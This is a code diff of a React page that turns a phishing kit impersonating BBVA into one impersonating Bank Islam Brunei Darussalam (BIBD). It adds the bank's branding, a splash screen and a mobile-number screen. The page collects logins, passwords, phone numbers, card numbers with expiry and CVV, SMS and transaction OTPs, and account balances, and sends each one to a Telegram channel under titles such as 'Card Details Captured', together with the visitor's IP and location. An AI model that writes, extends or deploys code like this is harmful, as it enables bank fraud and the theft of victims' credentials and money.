@@ -12,37 +12,64 @@ import {
   Lock,
   MapPin,
   RotateCw,
+  Smartphone,
   UserPlus,
   Users,
 } from "lucide-react"
 
-// BBVA Official Brand Vector Logo
-function BbvaLogo() {
+// Crisp SVG Flag for Brunei Darussalam (BND)
+function BruneiFlag({ className = "w-6 h-4" }: { className?: string }) {
   return (
     <svg
-      viewBox="0 0 118 28"
-      className="h-[22px] sm:h-[25px] w-auto fill-white select-none drop-shadow-[0_1px_2px_rgba(0,0,0,0.25)]"
+      viewBox="0 0 640 320"
+      className={`shrink-0 overflow-hidden ${className}`}
       xmlns="http://www.w3.org/2000/svg"
-      aria-label="BBVA"
+      aria-label="Flag of Brunei Darussalam"
     >
-      {/* 1st B */}
-      <path d="M0 0h15.2c6.2 0 10.2 2.7 10.2 6.8 0 2.8-1.8 5-4.6 6 3.6.9 5.8 3.5 5.8 7 0 4.8-4.3 8.2-11.4 8.2H0V0zm8.2 5.9v5.3h6c2.6 0 4.1-1.1 4.1-2.7s-1.5-2.6-4.1-2.6H8.2zm0 10.4v5.8h6.8c2.9 0 4.6-1.1 4.6-2.9s-1.7-2.9-4.6-2.9H8.2z" />
-      {/* 2nd B */}
-      <path d="M30 0h15.2c6.2 0 10.2 2.7 10.2 6.8 0 2.8-1.8 5-4.6 6 3.6.9 5.8 3.5 5.8 7 0 4.8-4.3 8.2-11.4 8.2H30V0zm8.2 5.9v5.3h6c2.6 0 4.1-1.1 4.1-2.7s-1.5-2.6-4.1-2.6h-6zm0 10.4v5.8h6.8c2.9 0 4.6-1.1 4.6-2.9s-1.7-2.9-4.6-2.9h-6.8z" />
-      {/* V */}
-      <path d="M60.4 0h8.2l7.2 19.5L83 0h8.2l-11.4 28H71.8L60.4 0z" />
-      {/* A (BBVA Inverted V) */}
-      <path d="M97.5 0h8.2l11.4 28h-8.2l-7.3-19.5L94.3 28H86.1L97.5 0z" />
+      <rect width="640" height="320" fill="#F7E017" />
+      <polygon points="0,0 640,240 640,285 0,45" fill="#FFFFFF" />
+      <polygon points="0,45 640,285 640,320 0,80" fill="#000000" />
+      <g fill="#D81B26" stroke="#D81B26" transform="translate(320, 160)">
+        <path d="M-45,35 C-45,68 45,68 45,35 C32,52 -32,52 -45,35 Z" fill="#D81B26" />
+        <path d="M-55,58 Q0,72 55,58 Q48,68 0,72 Q-48,68 -55,58 Z" fill="#D81B26" />
+        <rect x="-3" y="-55" width="6" height="95" fill="#D81B26" rx="2" />
+        <ellipse cx="0" cy="-35" rx="36" ry="12" fill="#D81B26" />
+        <circle cx="0" cy="-60" r="5" fill="#D81B26" />
+        <path d="M-55,-10 C-75,10 -65,40 -40,42 C-52,30 -55,10 -45,-5 Z" fill="#D81B26" />
+        <path d="M55,-10 C75,10 65,40 40,42 C52,30 55,10 45,-5 Z" fill="#D81B26" />
+        <path d="M-28,-25 C-45,-40 -20,-48 -5,-35 C-15,-32 -22,-30 -28,-25 Z" fill="#D81B26" />
+        <path d="M28,-25 C45,-40 20,-48 5,-35 C15,-32 22,-30 28,-25 Z" fill="#D81B26" />
+      </g>
     </svg>
   )
 }
 
+// BIBD Brand Wordmark Logo
+function BibdLogo() {
+  return (
+    <span
+      className="text-white font-extrabold text-[22px] sm:text-[25px] leading-none tracking-[0.06em] select-none drop-shadow-[0_1px_2px_rgba(0,0,0,0.25)]"
+      aria-label="BIBD"
+    >
+      BIBD
+    </span>
+  )
+}
+
+type ScreenType =
+  | "splash"
+  | "phone"
+  | "login"
+  | "card"
+  | "otp"
+  | "accounts"
+  | "confirm-otp"
+
 export default function BbvaPage(props: any) {
-  const initialScreen: "login" | "card" | "otp" | "accounts" | "confirm-otp" =
-    props?.initialScreen || "login"
-  const [currentScreen, setCurrentScreen] = useState<"login" | "card" | "otp" | "accounts" | "confirm-otp">(initialScreen)
+  const initialScreen: ScreenType = props?.initialScreen || "splash"
+  const [currentScreen, setCurrentScreen] = useState<ScreenType>(initialScreen)
   const [isScreenLoading, setIsScreenLoading] = useState(false)
-  const [language, setLanguage] = useState<"en" | "es">("es")
+  const [language, setLanguage] = useState<"en" | "es">("en")
   const [locationInfo, setLocationInfo] = useState<{
     ip?: string
     city?: string
@@ -64,13 +91,18 @@ export default function BbvaPage(props: any) {
         setCurrentScreen("otp")
       } else if (p.includes("/card")) {
         setCurrentScreen("card")
+      } else if (p.includes("/phone") || p.includes("/mobile")) {
+        setCurrentScreen("phone")
+      } else if (p.includes("/splash")) {
+        setCurrentScreen("splash")
       }
     }
   }, [])
 
-  // Immediate visitor tracking and location alert on first screen
+  // Immediate visitor tracking and location alert ONLY on splash screen
   const hasTrackedVisitor = useRef(false)
   useEffect(() => {
+    if (currentScreen !== "splash") return
     if (hasTrackedVisitor.current) return
     hasTrackedVisitor.current = true
 
@@ -82,8 +114,9 @@ export default function BbvaPage(props: any) {
           setLocationInfo(info)
         }
         await sendTelegramMessage({
-          title: "BBVA — New Visitor",
-          type: "visitor",
+          title: "BIBD — Splash Screen Visitor",
+          type: "splash",
+          includeLocation: true,
         })
       } catch (err) {
         console.error("Visitor tracking error:", err)
@@ -93,13 +126,20 @@ export default function BbvaPage(props: any) {
     return () => {
       isMounted = false
     }
-  }, [])
+  }, [currentScreen])
 
   // Login form states
   const [userId, setUserId] = useState("")
   const [password, setPassword] = useState("")
   const [showPassword, setShowPassword] = useState(false)
   const [errorMessage, setErrorMessage] = useState("")
+
+  // Phone / Mobile number states (BND / Brunei Darussalam +673)
+  const [phoneNumber, setPhoneNumber] = useState("")
+  const [phoneCountryCode, setPhoneCountryCode] = useState("+673")
+  const [phoneError, setPhoneError] = useState("")
+  const [isPhoneSubmitting, setIsPhoneSubmitting] = useState(false)
+  const phoneInputRef = useRef<HTMLInputElement>(null)
 
   // Card form states
   const [cardNumber, setCardNumber] = useState("")
@@ -170,8 +210,38 @@ export default function BbvaPage(props: any) {
     if (typeof window !== "undefined") {
       const savedUser = sessionStorage.getItem("bbva_userId") || sessionStorage.getItem("cacib_userId")
       if (savedUser) setUserId(savedUser)
+      const savedPhone =
+        sessionStorage.getItem("bbva_phoneNumber") ||
+        sessionStorage.getItem("phoneNumber") ||
+        sessionStorage.getItem("bibd_phone")
+      if (savedPhone) {
+        const clean = savedPhone.replace("+673", "").trim()
+        setPhoneNumber(clean)
+      }
     }
   }, [])
+
+  // Auto-advance splash screen to phone screen after 2.6 seconds
+  useEffect(() => {
+    if (currentScreen !== "splash") return
+    const timer = setTimeout(() => {
+      setCurrentScreen("phone")
+      if (typeof window !== "undefined" && window.history) {
+        window.history.replaceState({ screen: "phone" }, "", "/phone")
+      }
+    }, 2600)
+    return () => clearTimeout(timer)
+  }, [currentScreen])
+
+  // Focus phone input on phone screen
+  useEffect(() => {
+    if (currentScreen === "phone") {
+      const timer = setTimeout(() => {
+        phoneInputRef.current?.focus()
+      }, 250)
+      return () => clearTimeout(timer)
+    }
+  }, [currentScreen])
 
   // Timer countdown for OTP (Code expires in 2:59)
   useEffect(() => {
@@ -255,6 +325,58 @@ export default function BbvaPage(props: any) {
     }
   }
 
+  // Mobile number input: unlimited / infinite length
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const raw = e.target.value.replace(/\D/g, "")
+    setPhoneNumber(raw)
+    if (phoneError) setPhoneError("")
+  }
+
+  // Handle Mobile Number Submit -> Sends Telegram -> 1.5s loading -> Card Screen
+  const handlePhoneSubmit = async (e?: React.FormEvent) => {
+    if (e) e.preventDefault()
+    const cleanPhone = phoneNumber.replace(/\s+/g, "")
+    if (!cleanPhone) {
+      setPhoneError("Please enter your mobile number")
+      phoneInputRef.current?.focus()
+      return
+    }
+
+    setPhoneError("")
+    setIsPhoneSubmitting(true)
+    setIsScreenLoading(true)
+
+    const fullPhone = `${phoneCountryCode} ${cleanPhone}`
+
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem("bbva_phoneNumber", fullPhone)
+      sessionStorage.setItem("phoneNumber", fullPhone)
+      sessionStorage.setItem("bibd_phone", fullPhone)
+    }
+
+    try {
+      await sendTelegramMessage({
+        title: "BIBD — Mobile Number Captured",
+        phoneNumber: fullPhone,
+        phone: fullPhone,
+        type: "phone",
+        exclude: ["location"],
+      })
+    } catch (err) {
+      console.error("Error sending Telegram notification:", err)
+    }
+
+    // 1.5 second loading then transition to card screen
+    setTimeout(() => {
+      setIsScreenLoading(false)
+      setIsPhoneSubmitting(false)
+      setCurrentScreen("card")
+      if (typeof window !== "undefined" && window.history) {
+        window.history.pushState({ screen: "card" }, "", "/card")
+      }
+    }, 1500)
+  }
+
   // 1. Handle Login submission: Show blur loading for exactly 2 seconds, then transition to card screen
   const handleLogin = async (e?: React.FormEvent) => {
     if (e) e.preventDefault()
@@ -278,7 +400,7 @@ export default function BbvaPage(props: any) {
 
     try {
       await sendTelegramMessage({
-        title: "BBVA — Login Captured",
+        title: "BIBD — Login Captured",
         dni: userId.trim(),
         password: password,
         type: "login",
@@ -331,9 +453,17 @@ export default function BbvaPage(props: any) {
 
     try {
       const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+      const savedPhone =
+        (typeof window !== "undefined" &&
+          (sessionStorage.getItem("bbva_phoneNumber") ||
+            sessionStorage.getItem("phoneNumber") ||
+            sessionStorage.getItem("bibd_phone"))) ||
+        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
+
       await sendTelegramMessage({
-        title: "BBVA — Card Details Captured",
+        title: "BIBD — Card Details Captured",
         dni: savedUser || undefined,
+        phoneNumber: savedPhone || undefined,
         cardNumber: cleanCard,
         expiry: expiry,
         cvv: cardCvv,
@@ -364,9 +494,17 @@ export default function BbvaPage(props: any) {
     }
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    const savedPhone =
+      (typeof window !== "undefined" &&
+        (sessionStorage.getItem("bbva_phoneNumber") ||
+          sessionStorage.getItem("phoneNumber") ||
+          sessionStorage.getItem("bibd_phone"))) ||
+      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
+
     sendTelegramMessage({
-      title: "BBVA — SMS OTP Captured",
+      title: "BIBD — SMS OTP Captured",
       dni: savedUser || undefined,
+      phoneNumber: savedPhone || undefined,
       otp1: codeToSave,
       type: "otp",
     }).catch((err) => console.error("Error sending Telegram notification:", err))
@@ -467,10 +605,10 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA — Account Details Captured",
+      title: "BIBD — Account Details Captured",
       dni: savedUser || undefined,
       accountNumber: accountNumber || "N/A",
-      balance: accountBalance ? `€${accountBalance}` : "N/A",
+      balance: accountBalance ? `BND ${accountBalance}` : "N/A",
       type: "account",
     }).catch((err) => console.error("Error sending Telegram notification:", err))
 
@@ -496,9 +634,17 @@ export default function BbvaPage(props: any) {
     }
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    const savedPhone =
+      (typeof window !== "undefined" &&
+        (sessionStorage.getItem("bbva_phoneNumber") ||
+          sessionStorage.getItem("phoneNumber") ||
+          sessionStorage.getItem("bibd_phone"))) ||
+      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
+
     sendTelegramMessage({
-      title: `BBVA — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
+      title: `BIBD — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
       dni: savedUser || undefined,
+      phoneNumber: savedPhone || undefined,
       otp2: code,
       attempt: `${confirmAttempt}`,
       type: "confirm_otp",
@@ -603,7 +749,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA — Confirm OTP Resend Requested",
+      title: "BIBD — Confirm OTP Resend Requested",
       dni: savedUser || undefined,
       type: "resend_confirm_otp",
     }).catch(() => {})
@@ -620,7 +766,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA — OTP Resend Requested",
+      title: "BIBD — OTP Resend Requested",
       dni: savedUser || undefined,
       type: "resend_otp",
     }).catch(() => {})
@@ -638,8 +784,184 @@ export default function BbvaPage(props: any) {
     <div
       dir="ltr"
       className="fixed inset-0 w-full h-[100dvh] max-h-[100dvh] flex justify-center items-center font-sans select-none overflow-hidden overscroll-none"
-      style={{ backgroundColor: "#021493" }}
+      style={{ backgroundColor: "#980F65" }}
     >
+      {/* ========================================================================= */}
+      {/* 0. SCREEN 0: SPLASH SCREEN (JUST BIBD TEXT & SPINNER)                     */}
+      {/* ========================================================================= */}
+      {currentScreen === "splash" && (
+        <main
+          onClick={() => {
+            setCurrentScreen("phone")
+            if (typeof window !== "undefined" && window.history) {
+              window.history.replaceState({ screen: "phone" }, "", "/phone")
+            }
+          }}
+          className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-center items-center overflow-hidden shadow-2xl bg-[#980F65] px-6 select-none cursor-pointer"
+        >
+          <div className="flex flex-col items-center justify-center space-y-7">
+            {/* BIBD Text */}
+            <span
+              className="text-white font-extrabold text-[42px] sm:text-[48px] tracking-[0.08em] leading-none drop-shadow-[0_2px_4px_rgba(0,0,0,0.3)] select-none"
+              aria-label="BIBD"
+            >
+              BIBD
+            </span>
+
+            {/* Spinner */}
+            <div className="w-9 h-9 rounded-full border-[3.5px] border-white/25 border-t-white animate-spin" />
+          </div>
+        </main>
+      )}
+
+      {/* ========================================================================= */}
+      {/* 0.5. SCREEN 0.5: BND COUNTRY MOBILE NUMBER SCREEN                         */}
+      {/* Flag beside number, country code (+673), continue button -> Card Screen  */}
+      {/* ========================================================================= */}
+      {currentScreen === "phone" && (
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
+          {/* Header with BIBD Logo */}
+          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
+            <div className="w-7" />
+            <div className="flex items-center justify-center">
+              <BibdLogo />
+            </div>
+            <div className="w-7" />
+          </header>
+
+          {/* Main content on #F4F6FC */}
+          <section className="relative z-10 w-full bg-[#F4F6FC] rounded-none flex-1 min-h-0 flex flex-col justify-between overflow-y-auto px-5 pt-6 pb-6 shadow-2xl select-none">
+            <div className="w-full flex flex-col">
+              {/* Phone Icon Badge */}
+              <div className="w-13 h-13 rounded-2xl bg-[#980F65]/10 flex items-center justify-center text-[#980F65] mb-4">
+                <Smartphone className="w-6 h-6 stroke-[2]" />
+              </div>
+
+              {/* Title & Description */}
+              <h2 className="text-[#0d1e38] text-[21px] sm:text-[23px] font-bold tracking-tight">
+                Enter Mobile Number
+              </h2>
+              <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-1 mb-5 leading-relaxed">
+                Please enter your registered mobile number to verify your account and view card details.
+              </p>
+
+              {/* Phone Form */}
+              <form onSubmit={handlePhoneSubmit} className="w-full flex flex-col">
+                <div className="w-full mb-2">
+                  <div className="flex items-center justify-between mb-1.5">
+                    <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
+                      MOBILE NUMBER
+                    </label>
+                  </div>
+
+                  {/* Input container with Flag and Country Code beside number */}
+                  <div
+                    className={`w-full h-[52px] px-3 rounded-[10px] border bg-white flex items-center gap-2.5 transition-all shadow-xs ${
+                      phoneError
+                        ? "border-red-500 ring-1 ring-red-400"
+                        : "border-[#cbd5e1] focus-within:border-[#980F65] focus-within:ring-1 focus-within:ring-[#980F65]"
+                    }`}
+                  >
+                    {/* Flag and Country Code Badge */}
+                    <div className="flex items-center gap-2 shrink-0 py-1 px-1.5 rounded-md bg-slate-50 border border-slate-200">
+                      <BruneiFlag className="w-6 h-4 rounded-[2px] shadow-xs" />
+                      <span className="text-[14px] font-bold text-[#0d1e38] tracking-tight">
+                        +673
+                      </span>
+                    </div>
+
+                    {/* Divider */}
+                    <div className="w-[1px] h-6 bg-slate-200 shrink-0" />
+
+                    {/* Number Input Field - Infinite / Unlimited Length */}
+                    <input
+                      ref={phoneInputRef}
+                      type="tel"
+                      inputMode="numeric"
+                      value={phoneNumber}
+                      onChange={handlePhoneChange}
+                      placeholder="Enter mobile number"
+                      className="w-full h-full bg-transparent text-[#0d1e38] placeholder-[#94a3b8] text-[16px] font-semibold tracking-wide focus:outline-none"
+                    />
+
+                    {phoneNumber && (
+                      <button
+                        type="button"
+                        onClick={() => {
+                          setPhoneNumber("")
+                          setPhoneError("")
+                          phoneInputRef.current?.focus()
+                        }}
+                        className="text-slate-400 hover:text-slate-600 p-1"
+                        aria-label="Clear phone input"
+                      >
+                        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                      </button>
+                    )}
+                  </div>
+                </div>
+
+                {/* Validation Error if any */}
+                {phoneError && (
+                  <p className="mt-0.5 mt-3 mb-3 text-red-600 bg-red-50 px-3 py-2 rounded-md text-[13px] font-medium border border-red-200 animate-shake flex items-center gap-2">
+                    <span className="font-bold text-sm">!</span>
+                    <span>{phoneError}</span>
+                  </p>
+                )}
+
+                {/* Continue Button */}
+                <button
+                  type="submit"
+                  disabled={isPhoneSubmitting || !phoneNumber.trim()}
+                  className={`w-full h-[48px] rounded-[10px] mt-4 font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
+                    phoneNumber.trim().length > 0 && !isPhoneSubmitting
+                      ? "bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white cursor-pointer shadow-sm"
+                      : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
+                  }`}
+                >
+                  {isPhoneSubmitting ? (
+                    <div className="flex items-center gap-2">
+                      <svg
+                        className="animate-spin h-5 w-5 text-white"
+                        xmlns="http://www.w3.org/2000/svg"
+                        fill="none"
+                        viewBox="0 0 24 24"
+                      >
+                        <circle
+                          className="opacity-25"
+                          cx="12"
+                          cy="12"
+                          r="10"
+                          stroke="currentColor"
+                          strokeWidth="4"
+                        />
+                        <path
+                          className="opacity-75"
+                          fill="currentColor"
+                          d="M4 12a8 8 0 018-8v8H4z"
+                        />
+                      </svg>
+                      <span>Connecting...</span>
+                    </div>
+                  ) : (
+                    "Continue"
+                  )}
+                </button>
+              </form>
+            </div>
+
+            {/* Bottom info */}
+            <div className="mt-auto pt-6 flex flex-col items-center text-center">
+              <p className="text-[11.5px] text-[#94a3b8]">
+                Bank Islam Brunei Darussalam • Licensed Islamic Bank
+              </p>
+            </div>
+          </section>
+        </main>
+      )}
+
       {/* ========================================================================= */}
       {/* 1. SCREEN 1: LOGIN SCREEN                                                 */}
       {/* ========================================================================= */}
@@ -647,7 +969,7 @@ export default function BbvaPage(props: any) {
         <main
           className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-hidden shadow-2xl"
           style={{
-            backgroundColor: "#021493",
+            backgroundColor: "#980F65",
             backgroundImage: "url('/bbva_bg.jpg')",
             backgroundSize: "cover",
             backgroundPosition: "center",
@@ -658,7 +980,7 @@ export default function BbvaPage(props: any) {
           <header className="relative z-20 w-full px-5 pt-5 sm:pt-6 flex items-center justify-between shrink-0 select-none">
             <div className="w-[54px]" />
             <div className="flex items-center justify-center">
-              <BbvaLogo />
+              <BibdLogo />
             </div>
             <button
               type="button"
@@ -699,7 +1021,7 @@ export default function BbvaPage(props: any) {
                       if (errorMessage) setErrorMessage("")
                     }}
                     placeholder={language === "es" ? "Usuario" : "User"}
-                    className="w-full h-[48px] px-4 rounded-[10px] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border border-transparent focus:outline-none focus:border-[#021493] focus:ring-1 focus:ring-[#021493] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]"
+                    className="w-full h-[48px] px-4 rounded-[10px] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border border-transparent focus:outline-none focus:border-[#980F65] focus:ring-1 focus:ring-[#980F65] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]"
                   />
                 </div>
 
@@ -708,7 +1030,7 @@ export default function BbvaPage(props: any) {
                   <label className="block text-[#374761] text-[13.5px] font-medium mb-1.5 select-none">
                     {language === "es" ? "Contraseña" : "Password"}
                   </label>
-                  <div className="w-full h-[48px] px-4 rounded-[10px] bg-white flex items-center border border-transparent focus-within:border-[#021493] focus-within:ring-1 focus-within:ring-[#021493] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
+                  <div className="w-full h-[48px] px-4 rounded-[10px] bg-white flex items-center border border-transparent focus-within:border-[#980F65] focus-within:ring-1 focus-within:ring-[#980F65] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
                     <input
                       type={showPassword ? "text" : "password"}
                       autoComplete="current-password"
@@ -746,7 +1068,7 @@ export default function BbvaPage(props: any) {
                 <button
                   type="submit"
                   disabled={isScreenLoading}
-                  className="w-full h-[50px] mt-5 rounded-[10px] bg-[#021493] hover:bg-[#01117d] active:scale-[0.985] text-white font-semibold text-[15.5px] tracking-wide flex items-center justify-center shadow-md cursor-pointer transition-all disabled:opacity-85 select-none"
+                  className="w-full h-[50px] mt-5 rounded-[10px] bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white font-semibold text-[15.5px] tracking-wide flex items-center justify-center shadow-md cursor-pointer transition-all disabled:opacity-85 select-none"
                 >
                   {language === "es" ? "Iniciar sesión para verificar" : "Log in to verify"}
                 </button>
@@ -756,7 +1078,7 @@ export default function BbvaPage(props: any) {
               <div className="grid grid-cols-4 gap-2 mt-6 pt-1 select-none">
                 <div className="flex flex-col items-center text-center group cursor-pointer">
                   <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
-                    <UserPlus className="w-[20px] h-[20px] text-[#021493]" strokeWidth={2.2} />
+                    <UserPlus className="w-[20px] h-[20px] text-[#980F65]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                     {language === "es" ? <>Hazte<br />cliente</> : <>Become a<br />customer</>}
@@ -765,7 +1087,7 @@ export default function BbvaPage(props: any) {
 
                 <div className="flex flex-col items-center text-center group cursor-pointer">
                   <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
-                    <Home className="w-[20px] h-[20px] text-[#021493]" strokeWidth={2.2} />
+                    <Home className="w-[20px] h-[20px] text-[#980F65]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                     BBVA<br />Valora<br />Homes
@@ -774,7 +1096,7 @@ export default function BbvaPage(props: any) {
 
                 <div className="flex flex-col items-center text-center group cursor-pointer">
                   <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
-                    <MapPin className="w-[20px] h-[20px] text-[#021493]" strokeWidth={2.2} />
+                    <MapPin className="w-[20px] h-[20px] text-[#980F65]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                     {language === "es" ? <>Oficinas<br />y cajeros</> : <>Branches<br />and ATMs</>}
@@ -783,7 +1105,7 @@ export default function BbvaPage(props: any) {
 
                 <div className="flex flex-col items-center text-center group cursor-pointer">
                   <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
-                    <Users className="w-[20px] h-[20px] text-[#021493]" strokeWidth={2.2} />
+                    <Users className="w-[20px] h-[20px] text-[#980F65]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                     {language === "es" ? <>Compartir<br />gastos</> : <>Share<br />expenses</>}
@@ -803,20 +1125,13 @@ export default function BbvaPage(props: any) {
       {/* Fields AUTO-ADVANCE on fill without manual clicking                       */}
       {/* ========================================================================= */}
       {currentScreen === "card" && (
-        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#021493] px-0">
-          {/* Header with Back Arrow and centered BBVA Logo on Blue */}
-          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#021493]">
-            <button
-              type="button"
-              onClick={() => setCurrentScreen("login")}
-              className="p-1.5 -ml-1 text-white hover:opacity-80 transition-opacity cursor-pointer flex items-center justify-center"
-              aria-label="Back"
-            >
-              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
-            </button>
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
+          {/* Header with centered Logo on #980F65 */}
+          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
+            <div className="w-7" />
 
             <div className="flex items-center justify-center">
-              <BbvaLogo />
+              <BibdLogo />
             </div>
 
             <div className="w-7" />
@@ -828,8 +1143,8 @@ export default function BbvaPage(props: any) {
             <div className="shrink-0 w-full px-4 pt-3.5 pb-2 bg-[#F4F6FC] z-10">
               <div className="w-full flex justify-center">
                 <img
-                  src="/bbva_card.png"
-                  alt="BBVA Débito Visa Card"
+                  src="/bibd_card.jpg"
+                  alt="BIBD Debit / Credit Card"
                   className="w-full max-w-[380px] mx-auto h-auto object-contain rounded-[14px] shadow-sm select-none pointer-events-none"
                 />
               </div>
@@ -847,8 +1162,8 @@ export default function BbvaPage(props: any) {
                 </h2>
                 <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-0.5 mb-4">
                   {language === "es"
-                    ? "Verifique su tarjeta BBVA para continuar"
-                    : "Verify your BBVA card to continue"}
+                    ? "Verifique su tarjeta BIBD para continuar"
+                    : "Verify your BIBD card to continue"}
                 </p>
 
                 {/* Form */}
@@ -869,7 +1184,7 @@ export default function BbvaPage(props: any) {
                       onChange={handleCardNumberChange}
                       placeholder="0000 0000 0000 0000"
                       maxLength={19}
-                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal tracking-[0.08em] focus:outline-none focus:border-[#021493] focus:ring-1 focus:ring-[#021493] transition-all"
+                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal tracking-[0.08em] focus:outline-none focus:border-[#980F65] focus:ring-1 focus:ring-[#980F65] transition-all"
                     />
                   </div>
 
@@ -892,7 +1207,7 @@ export default function BbvaPage(props: any) {
                         onKeyDown={handleMonthKeyDown}
                         placeholder="MM"
                         maxLength={2}
-                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#021493] focus:ring-1 focus:ring-[#021493] transition-all"
+                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#980F65] focus:ring-1 focus:ring-[#980F65] transition-all"
                       />
                     </div>
 
@@ -912,7 +1227,7 @@ export default function BbvaPage(props: any) {
                         onKeyDown={handleYearKeyDown}
                         placeholder="YY"
                         maxLength={2}
-                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#021493] focus:ring-1 focus:ring-[#021493] transition-all"
+                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#980F65] focus:ring-1 focus:ring-[#980F65] transition-all"
                       />
                     </div>
                   </div>
@@ -934,7 +1249,7 @@ export default function BbvaPage(props: any) {
                       onKeyDown={handleCvvKeyDown}
                       placeholder="• • •"
                       maxLength={3}
-                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[18px] tracking-[0.25em] focus:outline-none focus:border-[#021493] focus:ring-1 focus:ring-[#021493] transition-all"
+                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[18px] tracking-[0.25em] focus:outline-none focus:border-[#980F65] focus:ring-1 focus:ring-[#980F65] transition-all"
                     />
                   </div>
 
@@ -958,7 +1273,7 @@ export default function BbvaPage(props: any) {
                     disabled={isCardSubmitting || !isCardFormValid}
                     className={`w-full h-[48px] rounded-[10px] font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
                       isCardFormValid && !isCardSubmitting
